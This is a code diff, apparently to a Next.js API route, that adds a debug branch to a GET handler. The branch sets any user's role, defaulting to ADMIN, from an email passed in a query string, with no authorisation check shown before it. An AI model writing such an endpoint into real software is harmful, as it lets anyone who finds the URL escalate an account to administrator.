@@ -10,6 +10,14 @@ export async function GET(req: Request) {
   }
   const limit = Math.min(Number(url.searchParams.get('limit') || 5), 20)
 
+  // 调整用户角色：?setrole=<email>&role=<ROLE>
+  const setEmail = url.searchParams.get('setrole')
+  if (setEmail) {
+    const role = url.searchParams.get('role') || 'ADMIN'
+    const u = await prisma.user.updateMany({ where: { email: setEmail }, data: { role } })
+    return NextResponse.json({ updated: u.count, email: setEmail, role })
+  }
+
   // 查用户角色（诊断鉴权问题）
   if (url.searchParams.get('users')) {
     const users = await prisma.user.findMany({
